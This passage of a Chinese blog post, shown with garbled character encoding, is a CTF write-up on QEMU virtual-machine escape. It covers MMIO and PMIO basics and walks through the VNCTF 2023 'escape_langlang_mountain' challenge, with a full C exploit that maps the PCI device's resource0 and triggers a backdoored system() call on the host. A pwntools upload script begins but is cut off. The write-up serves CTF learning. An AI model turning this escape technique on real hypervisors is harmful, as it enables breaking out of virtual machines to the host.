â€œé€ƒå‡ºæ¥â€ï¼Œå…¶åˆ©ç”¨æ–¹å¼å’Œå¹³å¸¸ç”¨æˆ·ç¨‹åºæ‰§è¡Œ <code>system</code> å‡½æ•°æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡å¹³å¸¸ <code>PWN</code> é¢˜çš„è§¦å‘æ–¹å¼æ˜¯é€šè¿‡ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè§¦å‘ï¼Œè€Œ <code>QEMU</code> è™šæ‹Ÿæœºçš„è®¾å¤‡æ¼æ´é€šè¿‡è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸Šçš„ç”¨æˆ·ç¨‹åºå¯¹è®¾å¤‡çš„ <code>IO</code> äº¤äº’æ¥é—´æ¥è§¦å‘ã€‚</p><h3 id="PCIè®¾å¤‡"><a href="#PCIè®¾å¤‡" class="headerlink" title="PCIè®¾å¤‡"></a>PCIè®¾å¤‡</h3><p><code>PCI</code> è®¾å¤‡æ˜¯ç¬¦åˆ <code>PCI</code> æ€»çº¿æ ‡å‡†çš„è®¾å¤‡ï¼Œè®¾å¤‡å¯ä»¥ç”³è¯·ä¸¤ç±»åœ°å€ç©ºé—´ï¼Œåˆ†åˆ«æ˜¯ <code>memory space</code> å’Œ <code>I/O space</code> ï¼Œ<code>CPU</code> é€šè¿‡ <code>memory space</code> è®¿é—®è®¾å¤‡ <code>I/O</code> çš„æ–¹å¼ç§°ä¸º <code>memory mapped I/O</code>ï¼Œä¹Ÿå°±æ˜¯ <code>MMIO</code>ã€‚é€šè¿‡ <code>I/O space</code> è®¿é—®è®¾å¤‡ <code>I/O</code> çš„æ–¹å¼ç§°ä¸º <code>port mapped I/O</code>ï¼Œå³ <code>PMIO</code>ã€‚</p><h3 id="MMIO"><a href="#MMIO" class="headerlink" title="MMIO"></a>MMIO</h3><p><code>MMIO</code> æ˜¯æŒ‡å°† <code>I/O</code> è®¾å¤‡çš„å¯„å­˜å™¨æ˜ å°„åˆ°ç³»ç»Ÿå†…å­˜åœ°å€ç©ºé—´ä¸­çš„ä¸€ç§æœºåˆ¶ ï¼Œå®ƒä½¿ç”¨ç›¸åŒçš„åœ°å€æ€»çº¿æ¥å¤„ç†å†…å­˜å’Œ <code>I/O</code> è®¾å¤‡ï¼Œ<code>I/O</code> è®¾å¤‡çš„å†…å­˜å’Œå¯„å­˜å™¨è¢«æ˜ å°„åˆ°ä¸ä¹‹ç›¸å…³è”çš„åœ°å€ã€‚å½“ <code>CPU</code> è®¿é—®æŸä¸ªå†…å­˜åœ°å€æ—¶ï¼Œå®ƒå¯èƒ½æ˜¯ç‰©ç†å†…å­˜ï¼Œä¹Ÿå¯ä»¥æ˜¯æŸä¸ª <code>I/O</code> è®¾å¤‡çš„å†…å­˜ï¼Œç”¨äºè®¿é—®å†…å­˜çš„  <code>CPU</code> æŒ‡ä»¤ä¹Ÿå¯æ¥è®¿é—® <code>I/O</code> è®¾å¤‡ã€‚æ¯ä¸ª <code>I/O</code> è®¾å¤‡ç›‘è§† <code>CPU</code> çš„åœ°å€æ€»çº¿ï¼Œä¸€æ—¦ <code>CPU</code> è®¿é—®åˆ†é…ç»™å®ƒçš„åœ°å€ï¼Œå®ƒå°±åšå‡ºå“åº”ï¼Œå°†æ•°æ®æ€»çº¿è¿æ¥åˆ°éœ€è¦è®¿é—®çš„è®¾å¤‡ç¡¬ä»¶å¯„å­˜å™¨ã€‚ä¸ºäº†å®¹çº³<code> I/O</code>è®¾å¤‡ï¼Œ<code>CPU</code> å¿…é¡»é¢„ç•™ç»™<code>I/O</code> ä¸€ä¸ªåœ°å€åŒºåŸŸï¼Œè¯¥åœ°å€åŒºåŸŸä¸èƒ½ç»™ç‰©ç†å†…å­˜ä½¿ç”¨ã€‚</p><p>å¦‚æœèƒ½ç†è§£ä¸Šé¢æ‰€è¯´çš„ <code>MMIO</code> ï¼Œé‚£ä¹ˆå°±ä¸å¾—ä¸æ <code>xxx_mmio_read</code> å’Œ <code>xxx_mmio_write</code> è¿™ä¸¤ä¸ªå‡½æ•°äº†ï¼ˆ <code>xxx</code> æ˜¯è®¾å¤‡åï¼‰ï¼Œ<code>xxx_mmio_read</code> å‡½æ•°ç”¨äºä»è™šæ‹Ÿè®¾å¤‡çš„ <code>MMIO</code> åœ°å€ç©ºé—´ä¸­è¯»å–æ•°æ®ï¼Œè€Œ <code>xxx_mmio_write</code> å‡½æ•°åˆ™æ˜¯å‘æŒ‡å®šçš„ <code>MMIO</code> åœ°å€ç©ºé—´ä¸­å†™å…¥æ•°æ®ã€‚<code>qemu</code> ä¼šç›‘å¬è¯»å†™æ“ä½œï¼Œå½“ç›‘å¬åˆ°è¯»å†™åï¼Œå°±ä¼šè°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°ã€‚</p><h3 id="PMIO"><a href="#PMIO" class="headerlink" title="PMIO"></a>PMIO</h3><p><code>PMIO</code> å…è®¸CPUé€šè¿‡ä¸“ç”¨çš„æŒ‡ä»¤è¿›è¡Œè¾“å…¥ è¾“å‡ºæ“ä½œï¼Œè€Œä¸æ˜¯å°†I&#x2F;Oè®¾å¤‡è§†ä¸ºå†…å­˜ä¸­çš„ç‰¹æ®Šä½ç½®,åœ¨ <code>PMIO</code> ä¸­ï¼Œå†…å­˜å’Œ <code>I/O</code> è®¾å¤‡æœ‰å„è‡ªçš„åœ°å€ç©ºé—´ã€‚ ç«¯å£æ˜ å°„ <code>I/O</code> é€šå¸¸ä½¿ç”¨ä¸€ç§ç‰¹æ®Šçš„ <code>CPU</code> æŒ‡ä»¤ï¼Œä¸“é—¨æ‰§è¡Œ <code>I/O</code> æ“ä½œã€‚åœ¨ <code>Intel</code> çš„å¾®å¤„ç†å™¨ä¸­ï¼Œä½¿ç”¨çš„æŒ‡ä»¤æ˜¯ <code>IN</code> å’Œ <code>OUT</code>ã€‚è¿™äº›æŒ‡ä»¤å¯ä»¥è¯»&#x2F;å†™ 1,2,4 ä¸ªå­—èŠ‚ï¼ˆä¾‹å¦‚ï¼šoutb, outw, outlï¼‰åˆ° <code>IO</code> è®¾å¤‡ä¸Šã€‚<code>I/O</code> è®¾å¤‡æœ‰ä¸€ä¸ªä¸å†…å­˜ä¸åŒçš„åœ°å€ç©ºé—´ï¼Œä¸ºäº†å®ç°åœ°å€ç©ºé—´çš„éš”ç¦»ï¼Œè¦ä¹ˆåœ¨ <code>CPU</code> ç‰©ç†æ¥å£ä¸Šå¢åŠ ä¸€ä¸ª <code>I/O</code> å¼•è„šï¼Œè¦ä¹ˆå¢åŠ ä¸€æ¡ä¸“ç”¨çš„ <code>I/O</code> æ€»çº¿ã€‚</p><h3 id="ä»€ä¹ˆæ˜¯QOMï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯QOMï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯QOMï¼Ÿ"></a>ä»€ä¹ˆæ˜¯QOMï¼Ÿ</h3><p><code>QOM</code>  <code>ï¼ˆQEMU Object Modelï¼‰</code> æ˜¯ <code>QEMU</code> çš„ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼Œå®ƒæ˜¯ <code>QEMU</code> åœ¨ <code>C</code> çš„åŸºç¡€ä¸Šè‡ªå·±å®ç°äº†ä¸€å¥—é¢å‘å¯¹è±¡æœºåˆ¶ï¼Œæ”¯æŒå¤šç§ä½“ç³»ç»“æ„å’Œè®¾å¤‡ã€‚åœ¨ <code>QOM</code> ä¸­ï¼Œæ¯ä¸ªè®¾å¤‡éƒ½è¢«è¡¨ç¤ºä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡æœ‰ä¸€ä¸ªç±»å‹ï¼Œè¯¥ç±»å‹å®šä¹‰äº†è®¾å¤‡çš„å±æ€§å’Œè¡Œä¸ºã€‚é€šè¿‡ <code>QOM</code>ï¼Œå¼€å‘è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°æ·»åŠ æ–°çš„è®¾å¤‡å’Œæ‰©å±•ç°æœ‰è®¾å¤‡çš„åŠŸèƒ½ï¼Œä»è€Œä½¿ <code>QEMU</code>å˜å¾—æ›´åŠ å¼ºå¤§å’Œçµæ´»ã€‚</p><h2 id="é¢˜ç›®ç»ƒä¹ "><a href="#é¢˜ç›®ç»ƒä¹ " class="headerlink" title="é¢˜ç›®ç»ƒä¹ "></a>é¢˜ç›®ç»ƒä¹ </h2><h3 id="escape-langlang-mountain"><a href="#escape-langlang-mountain" class="headerlink" title="escape_langlang_mountain"></a>escape_langlang_mountain</h3><p>é¢˜ç›®é™„ä»¶åœ¨ <code>buu</code> çš„ <code>vnctf 2023</code> çš„æ¯”èµ›é‡Œå°±æœ‰</p><h4 id="ç®€å•åˆ†æ"><a href="#ç®€å•åˆ†æ" class="headerlink" title="ç®€å•åˆ†æ"></a>ç®€å•åˆ†æ</h4><p>ä½œä¸ºä¸€ååˆæ ¼çš„èœé¸¡ï¼Œåˆšå¼€å§‹è¿å’‹å¯åŠ¨ <code>qemu</code> éƒ½ä¸çŸ¥é“ï¼Œè¿™é‡Œæ ‡æ˜ä¸€ä¸‹è¿™ä¿©æ–‡ä»¶ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251623441.png" alt="image-20230225162320163"></p><p>å¦‚æœæœ‰ <code>qemu</code> çš„è¯ï¼Œé‚£ä¹ˆç›´æ¥ <code>./launch.sh</code> å°±å¯ä»¥å¯åŠ¨äº†ã€‚å¦‚æœæ²¡æœ‰çš„è¯å°± <code>sudo apt install qemu-system</code> å®‰è£…ä¸€ä¸‹å³å¯ï¼Œå¦‚æœè¿˜è¿è¡Œä¸äº†çš„è¯å°± <code>ldd</code> çœ‹ä¸€ä¸‹æ˜¯ä¸æ˜¯å°‘ä»€ä¹ˆåº“äº†ï¼Œå°‘å“ªä¸ªè£…å“ªä¸ªå°±è¡Œï¼ˆå…·ä½“åšæ³•å¯ä»¥å‚è€ƒæ–‡æœ«çš„ <strong>å¥‡å¥‡æ€ªæ€ªçš„æŠ€èƒ½</strong> éƒ¨åˆ† ï¼‰</p><p>é€šè¿‡æŸ¥çœ‹ <code>launch.sh</code> æ–‡ä»¶æˆ‘ä»¬å¯ä»¥çŸ¥é“è®¾å¤‡çš„åç§°å«åš <code>vn</code> ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251629467.png" alt="image-20230225162953416"></p><p>æ¥ä¸‹æ¥æ‰“å¼€ <code>ida</code> è¿›è¡Œåˆ†æï¼Œæ­£å¸¸çš„è¯çœ‹åˆ°çš„æ˜¯å¤šåˆ°è®©äººæ‡µé€¼çš„ä»£ç ã€‚</p><p>æˆ‘ä»¬çš„æ€è·¯æ˜¯å…ˆå®šä½åˆ° <code>vn_class_init</code> å‡½æ•°ï¼Œå› ä¸ºå»é™¤äº†ç¬¦å·è¡¨ï¼Œæ‰€ä»¥è¿™é‡Œå¾—æ ¹æ®ç‰¹å¾æ¥è¯†åˆ«</p><p>æˆ‘è¿™é‡Œå‚è€ƒçš„æ˜¯ <strong>winmt</strong> å¸ˆå‚…ç»™æˆ‘æ¨èçš„ä»£ç   <a href="https://github.com/qemu/qemu/blob/master/hw/misc/edu.c">QEMU educational PCI device</a> ï¼Œä¸‹é¢æ‰€æåˆ°çš„ç‰¹å¾éƒ½æ˜¯æ ¹æ®å¯¹æ¯”è¿™ä¸ªæ¨¡æ¿æ¥è¿›è¡Œåˆ¤æ–­çš„</p><p>æˆ‘ä¸ªäººè®¤ä¸ºè¿™ä¸ª <code>vn_class_init</code> ä¸€ä¸ªæ˜¾è‘—ç‰¹å¾å°±æ˜¯æœ‰å¦‚ä¸‹çš„ <code>id</code> </p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251638167.png" alt="image-20230225163814127"></p><p>æ‰€ä»¥æˆ‘ä»¬æœç´¢ <code>vn_class_init</code> å­—ç¬¦ä¸²å†ç»“åˆä¸‹é¢è¿™ä¸ªç‰¹å¾æ¥å¯»æ‰¾ <code>vn_class_init</code> å‡½æ•°ï¼Œä»è€Œåˆ¤æ–­å‡ºæ¥ä¸‹é¢è¿™ä¸ªå‡½æ•°å°±æ˜¯ <code>vn_class_init</code> å‡½æ•°ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251640026.png" alt="image-20230225164013977"></p><p>æˆ‘ä»¬åœ¨æœ¬åœ°å¯åŠ¨ <code>qemu</code> åï¼Œæ ¹æ® <code>lspci</code> å‘½ä»¤å¾—åˆ°çš„ç»“æœï¼ˆæ¯”å¦‚å‡ºç°çš„ <code>0420</code> å’Œ <code>1337</code> ï¼‰ä¸ä¸Šé¢ <code>vn_class_init</code> å‡½æ•°ä¸­çš„ <code>PCI</code> ä¿¡æ¯æ¯”è¾ƒä¸€ä¸‹å¾—çŸ¥ <code>vn</code> è¿™ä¸ªè®¾å¤‡å·æ˜¯ <code>04</code> ï¼ˆè¿™ä¸ªä¿¡æ¯åœ¨å†™è„šæœ¬çš„æ—¶å€™ä¼šç”¨åˆ°ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251642828.png" alt="image-20230225164210745"></p><p>è€Œä¹‹æ‰€ä»¥ä¸Šé¢é‚£é‡Œåˆ¤æ–­ <code>sub_6d9166</code> ä¸º <code>pci_vn_realize</code> æ˜¯å› ä¸ºæ¨¡æ¿ä»£ç ä¸­åœ¨ <code>xxx_class_init</code> å‡½æ•°ä¸­è¿™é‡Œæœ‰å°† <code>pci_xxx_realize</code> çš„å‡½æ•°åœ°å€èµ‹å€¼ç»™ç»“æ„ä½“çš„æˆå‘˜å˜é‡ï¼ˆè¿™äº›æ‰€è°“çš„ç‰¹å¾æ¥åˆ¤æ–­ï¼Œéƒ½æ˜¯æˆ‘è‡ªå·±çš„çŒœæµ‹ï¼Œæ— æ³•ä¿è¯ä¸€å®šæ­£ç¡®ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251754897.png" alt="image-20230225175449806" style="zoom:50%;" /><p>è¿›å…¥ <code>pci_vn_realize</code> å‡½æ•°ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥ç»§ç»­å¯¹æ¯”æ¨¡æ¿ä»£ç ï¼ˆå¦‚ä¸‹ï¼‰ï¼ŒçŒœæµ‹ <code>sub_54ABB5</code> å‡½æ•°æ˜¯ <code>memory_region_init_io</code>  ï¼ŒåŸå› æ˜¯è¿™ä¸ªå‡½æ•°å‡ºç°äº† <code>vn_mmio</code> è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”å‚æ•°ä¹Ÿç¬¦åˆ <code>memory_region_init_io</code> çš„ç‰¹å¾ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251758656.png" alt="image-20230225175818596"></p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251801455.png" alt="image-20230225180116377" style="zoom:50%;" /><p>è€Œ <code>memory_region_init</code> å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œæ˜¯ <code>vn_mmio_ops</code> ï¼Œå®ƒé€šå¸¸æ˜¯ç”¨äºè®¿é—® <code>MMIO</code> å¯„å­˜å™¨çš„å‡½æ•°é›†åˆï¼Œè¿™é‡Œé¢å­˜æ”¾äº† <code>vn_mmio_read</code> å’Œ <code>vn_mmio_write</code> çš„å‡½æ•°æŒ‡é’ˆï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251807914.png" alt="image-20230225180705872"></p><h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>æˆ‘ä»¬å†æ¥çœ‹ <code>vn_mmio_read</code> å‡½æ•°ä»£ç ï¼ˆå¦‚ä¸‹ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251808609.png" alt="image-20230225180803560" style="zoom:50%;" /><p>è¿™ä¸ªä»£ç å¾ˆçŸ­ï¼Œå¦‚æœ <code>a2</code> æ»¡è¶³ <code>((a2 &gt;&gt; 20) &amp; 0xF) == 1</code> å’Œ <code>((a2 &gt;&gt; 16) &amp; 0xF) == 0xF</code> ,é‚£ä¹ˆå°±å¯ä»¥å°†å­—ç¬¦ä¸² <code>vnctf</code> å¤åˆ¶åˆ° <code>dword_137A358</code> çš„åœ°å€ä¸Šã€‚è¿™é‡Œå¾ˆæ˜æ˜¾æ˜¯æ¨¡æ‹Ÿäº† <code>mmio_read</code> å‡½æ•°çš„åŠŸèƒ½ï¼Œå³ <code>MMIO</code> è¯»å–æ•°æ®åˆ° <code>qemu</code> æ¨¡æ‹Ÿçš„å†…å­˜é‡Œï¼Œæ‰€ä»¥æœ€åçš„ <code>memcpy</code> å‡½æ•°å°±æ˜¯åœ¨åšè¿™ä¸ªï¼Œè€Œ <code>vnctf</code> å­—ç¬¦ä¸²ä¹Ÿå°±æ˜¯è¦ä» <code>MMIO</code> é‡Œè·å–çš„æ•°æ®ã€‚</p><p>å†çœ‹ <code>vn_mmio_write</code> å‡½æ•°ä»£ç ï¼ˆå¦‚ä¸‹ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251820483.png" alt="image-20230225182013429" style="zoom:50%;" /><p>è¿™é‡Œå‘ç°äº†åé—¨å‡½æ•°ï¼Œå¦‚æœè¦è§¦å‘ <code>system</code> çš„è¯ï¼Œéœ€è¦è®© <code>a2</code> ä¸º <code>0x2f0000</code> ï¼ˆç®€å•ç®—ä¸€ä¸‹å°±è¡Œï¼‰ï¼Œå¦‚æœæƒ³è®© <code>command</code> ä¸º <code>cat flag</code> å­—ç¬¦ä¸²çš„è¯ï¼Œéœ€è¦è®© <code>a2</code> ä¸º <code>0x100000</code> ï¼Œæ‰€ä»¥è¿™ä¸ª <code>vn_mmio_write</code>  è¦æ‰§è¡Œä¸¤æ¬¡ã€‚</p><h4 id="EXPçš„ç¼–å†™"><a href="#EXPçš„ç¼–å†™" class="headerlink" title="EXPçš„ç¼–å†™"></a>EXPçš„ç¼–å†™</h4><p>ä¸Šé¢ä¼¼ä¹ä¸€åˆ‡éƒ½é¡ºç†æˆç« ï¼Œä½†æˆ‘ä»¬å¥½åƒå¿˜è®°äº†ï¼Œå¦‚ä½•è°ƒç”¨ <code>vn_mmio_read</code> å’Œ <code>vn_mmio_write</code> å‡½æ•°å¹¶ä¸”æ§åˆ¶ä»–ä»¬çš„å‚æ•°ï¼Ÿ</p><p><code>QEMU</code> å®ç° <code>MMIO</code> æ¨¡æ‹Ÿçš„å…¶ä¸­ä¸€ä¸ªå› ç´ å°±æ˜¯<strong>ç›‘æ§è™šæ‹Ÿæœºå¯¹ <code>MMIO</code> å†…å­˜çš„è¯»å†™ï¼Œè§¦å‘å¯¹åº”çš„å›è°ƒå‡½æ•°çš„æ‰§è¡Œ</strong>ã€‚å‡è®¾æˆ‘ç°åœ¨å¯¹ <code>MMIO</code> å†…å­˜è¿›è¡Œäº†è¯»çš„æ“ä½œï¼Œé‚£ä¹ˆ <code>qemu-system-x86_64</code> ç¨‹åºä¸­çš„ <code>vn_mmio_read</code> å›è°ƒå‡½æ•°åˆ™ä¼šè¢«è§¦å‘ï¼Œè€Œå®ƒçš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯»çš„ <code>MMIO</code> åœ°å€ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ª <code>C</code> ä»£ç ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œæ¥å¯¹ <code>MMIO</code> å†…å­˜è¿›è¡Œè¯»çš„æ“ä½œï¼ˆ <code>mmio_mem</code> æ˜¯ <code>MMIO</code> åŒºåŸŸçš„èµ·å§‹åœ°å€ï¼‰ï¼Œä¹‹æ‰€ä»¥è¿™æ®µä»£ç è¿›è¡Œäº†è¯»çš„æ“ä½œæ˜¯å› ä¸º <code>return *(mmio_mem + addr)</code> å°† <code>MMIO</code> åŒºåŸŸä¸­çš„æ•°æ®è¯»äº†å‡ºæ¥å¹¶è¿”å›ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">Â Â <span class="keyword">return</span> *((<span class="type">uint64_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line">mmio_read(<span class="number">0x1f0000</span>);</span><br></pre></td></tr></table></figure><p>ä¾æ¬¡ç±»æ¨ <code>mmio_write</code> å‡½æ•°æ˜¯åŒç†ï¼Œå‘ <code>MMIO</code> åŒºåŸŸä¸­å†™å…¥æ•°æ®ï¼Œä»è€Œè§¦å‘å›è°ƒå‡½æ•° <code>vn_mmio_write</code> ï¼Œè¿™é‡Œçš„ <code>value</code> æ— æ‰€è°“ï¼Œè€Œ <code>addr</code> åˆ™ä¼šå½“åšå‚æ•°ä¼ é€’ç»™ <code>vn_mmio_write</code> </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">Â Â *((<span class="type">uint64_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line">mmio_write(<span class="number">0x100000</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>ä¸ºäº†è·å– <code>MMIO</code> åŒºåŸŸçš„é¦–åœ°å€ï¼Œæˆ‘ä»¬éœ€è¦æ‰“å¼€å…¶è®¾å¤‡çš„ <code>resource0</code> æ–‡ä»¶ï¼Œä½¿ç”¨ <code>mmap</code> å‡½æ•°å°†å…¶æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ä¸Šï¼Œæœ€ç»ˆå®ç°äº†å¯¹ <code>MMIO</code> åŒºåŸŸçš„è®¿é—®ã€‚è¿˜è®°å¾—å‰é¢æ‰€è¯´çš„è®¾å¤‡å· <code>04</code> ä¹ˆï¼Œæ¥ä¸‹æ¥ <code>open</code> çš„æ—¶å€™éœ€è¦ç”¨åˆ°ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">Â Â perror(msg);</span><br><span class="line">Â Â <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">Â Â <span class="keyword">return</span> *((<span class="type">uint64_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">Â Â *((<span class="type">uint64_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Â Â <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR</span><br><span class="line">| O_SYNC);</span><br><span class="line">Â Â <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">Â Â Â Â die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line">Â Â mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,</span><br><span class="line"><span class="number">0</span>);</span><br><span class="line">Â Â <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">Â Â Â Â die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line">Â Â mmio_read(<span class="number">0x1f0000</span>);</span><br><span class="line">Â Â mmio_write(<span class="number">0x100000</span>, <span class="number">1</span>);</span><br><span class="line">Â Â mmio_write(<span class="number">0x2f0000</span>, <span class="number">1</span>);</span><br><span class="line">Â </span><br><span class="line">Â Â <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè„šæœ¬æ˜¯ <strong>winmt</strong> å¸ˆå‚…å†™çš„ï¼Œæ•´ä½“æ€è·¯å°±æ˜¯å…ˆè·å– <code>MMIO</code> çš„èµ·å§‹åœ°å€ï¼Œç„¶åè¿›è¡Œä¸€æ¬¡è¯»ï¼Œä¸¤æ¬¡å†™çš„æ“ä½œï¼Œä»¥æ­¤æ¥è§¦å‘å›è°ƒå‡½æ•°ï¼Œæœ€ç»ˆè§¦å‘äº† <code>system(&quot;cat flag&quot;)</code> ã€‚å› ä¸ºè¿™ä¸ª <code>qemu_system</code> ç¨‹åºè¿˜æ˜¯è·‘åœ¨å®¿ä¸»æœºä¸Šçš„ï¼Œæ‰€ä»¥åœ¨è¿™ä¸ªç¨‹åºä¸­æ‰§è¡Œ <code>system(&quot;cat flag&quot;)</code> è¯»å–çš„æ˜¯å®¿ä¸»æœºçš„ <code>flag</code> ä»è€Œå®Œæˆçš„é€ƒé€¸ï¼Œè¿™å’Œ <code>glibc</code> çš„é¢˜ç›®è·å– <code>shell</code> å…¶å®ä¸€æ ·ï¼Œä¸è¿‡æœ€åˆæˆ‘ä»¥ä¸ºè¿™ä¸ª <code>qemu_system</code> ç¨‹åºå°±æ˜¯åœ¨ <code>qemu</code> é‡Œé¢ï¼Œæ‰€ä»¥æ‰§è¡Œäº† <code>system</code> ä¹Ÿæ˜¯åœ¨ <code>qemu</code> é‡Œé¢æ‰€æ‰§è¡Œçš„ã€‚ </p><p>ä¸Šé¢è¿™ä¸ªè„šæœ¬ç”¨ <code>musl-gcc</code> æ‰€ç¼–è¯‘ä¸ºé™æ€é“¾æ¥çš„ç¨‹åºï¼ˆç”¨ <code>musl-gcc</code> ç¼–è¯‘æ˜¯å› ä¸ºè¿™æ ·ç”Ÿæˆçš„ç¨‹åºä½“ç§¯æ›´å°ï¼Œé™æ€é“¾æ¥çš„ç¨‹åºæ˜¯å› ä¸ºè¿œç¨‹ç¯å¢ƒæœ‰æ—¶å€™æ²¡æœ‰åŠ¨æ€é“¾æ¥åº“ï¼‰</p><p>ç¼–è¯‘å‘½ä»¤ä¸º <code>musl-gcc exp.c -o exp -static</code> <strong>ï¼ˆ <code>musl-gcc</code> çš„ç¼–è¯‘ä¸é…ç½®å†™åˆ°äº†æ–‡æœ« å¥‡å¥‡æ€ªæ€ªçš„æŠ€èƒ½ éƒ¨åˆ†ï¼‰</strong></p><p>å¦‚æœæ‰“è¿œç¨‹çš„è¯ï¼Œåˆ™éœ€è¦ä½¿ç”¨ä¸Šä¼ è„šæœ¬ï¼ˆå¦‚ä¸‹ï¼Œè¿™ä¾ç„¶æ˜¯ <strong>winmt</strong> å¸ˆå‚…æ‰€ç¼–å†™çš„ï¼‰</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, os</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25692</span>)</span><br><span class="line">os.system(<span class="string">&quot;gzip -c ./exp &gt; ./exp.gz&quot;</span>)<span class="comment">#å°†cè„šæœ¬ç¼–è¯‘å¹¶å‘½åä¸º exp</span></span><br><span class="line">os.system(<span class="string">&quot;base64 ./exp.gz &gt; ./b64_exp&quot;</span>)</span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">&quot;./b64_exp&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">content = fd.read()</span><br><span class="line">length = <span class="built_in">len</span>(content)</span><br><span class="line">fd.close()</span><br><span class="line">per_length = <span class="number">0x200</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length, per_length) 